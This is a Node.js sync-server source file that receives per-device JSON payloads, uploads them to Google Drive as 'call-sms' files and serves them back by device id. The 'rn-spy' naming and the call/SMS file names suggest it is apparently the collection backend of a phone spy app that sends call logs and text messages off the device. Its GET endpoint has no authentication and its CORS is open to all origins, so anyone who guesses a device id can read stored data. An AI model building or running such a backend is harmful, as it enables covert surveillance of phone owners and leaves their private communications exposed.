const { createSign } = require('crypto');
const http = require('http');

const store = new Map();
const GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token';
const GOOGLE_DRIVE_UPLOAD_URL =
  'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,name,webViewLink';
const GOOGLE_DRIVE_SCOPE = 'https://www.googleapis.com/auth/drive.file';

function base64Url(value) {
  return Buffer.from(value).toString('base64url');
}

function googleDriveConfig(requestedFolderId) {
  const privateKey = process.env.GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY?.replace(/\\n/g, '\n');
  const email = process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;
  const folderId =
    (typeof requestedFolderId === 'string' && requestedFolderId.trim()) ||
    process.env.GOOGLE_DRIVE_FOLDER_ID;

  return privateKey && email && folderId ? { privateKey, email, folderId } : null;
}

async function getGoogleAccessToken({ email, privateKey }) {
  const issuedAt = Math.floor(Date.now() / 1000);
  const header = base64Url(JSON.stringify({ alg: 'RS256', typ: 'JWT' }));
  const claimSet = base64Url(
    JSON.stringify({
      iss: email,
      scope: GOOGLE_DRIVE_SCOPE,
      aud: GOOGLE_TOKEN_URL,
      iat: issuedAt,
      exp: issuedAt + 60 * 60,
    }),
  );
  const assertion = `${header}.${claimSet}`;
  const signer = createSign('RSA-SHA256');
  signer.update(assertion);
  signer.end();
  const signature = signer.sign(privateKey, 'base64url');

  const response = await fetch(GOOGLE_TOKEN_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      assertion: `${assertion}.${signature}`,
    }).toString(),
  });
  const result = await response.json();
  if (!response.ok || !result.access_token) {
    throw new Error(result.error_description || 'Unable to authenticate with Google Drive');
  }
  return result.access_token;
}

async function uploadToGoogleDrive(payload) {
  const config = googleDriveConfig(payload.driveFolderId);
  if (!config) {
    throw new Error('Google Drive is not configured on the sync server');
  }

  const timestamp = new Date(payload.sentAt).toISOString().replace(/[:.]/g, '-');
  const deviceId = payload.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
  const metadata = {
    name: `call-sms-${deviceId}-${timestamp}.json`,
    parents: [config.folderId],
    mimeType: 'application/json',
  };
  const boundary = `rn-spy-${Date.now()}`;
  const requestBody = [
    `--${boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${JSON.stringify(metadata)}\r\n`,
    `--${boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${JSON.stringify(payload)}\r\n`,
    `--${boundary}--`,
  ].join('');
  const accessToken = await getGoogleAccessToken(config);
  const response = await fetch(GOOGLE_DRIVE_UPLOAD_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${accessToken}`,
      'Content-Type': `multipart/related; boundary=${boundary}`,
    },
    body: requestBody,
  });
  const result = await response.json();
  if (!response.ok) {
    throw new Error(result.error?.message || 'Google Drive upload failed');
  }
  return result;
}

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/sync') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', async () => {
      let payload;
      try {
        payload = JSON.parse(body);
      } catch {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'invalid json' }));
        return;
      }

      if (!payload.deviceId) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'deviceId required' }));
        return;
      }

      try {
        const driveFile = await uploadToGoogleDrive(payload);
        store.set(payload.deviceId, payload);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, driveFile }));
      } catch {
        res.writeHead(502, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Sync or Google Drive upload failed' }));
      }
    });
    return;
  }

  const pullMatch = req.url?.match(/^\/api\/sync\/(.+)$/);
  if (req.method === 'GET' && pullMatch) {
    const deviceId = decodeURIComponent(pullMatch[1]);
    const payload = store.get(deviceId);
    if (!payload) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'not found' }));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(payload));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'not found' }));
});

const port = Number(process.env.PORT || 3000);
server.listen(port, '0.0.0.0', () => {
  console.log(`Sync server running on http://0.0.0.0:${port}`);
});
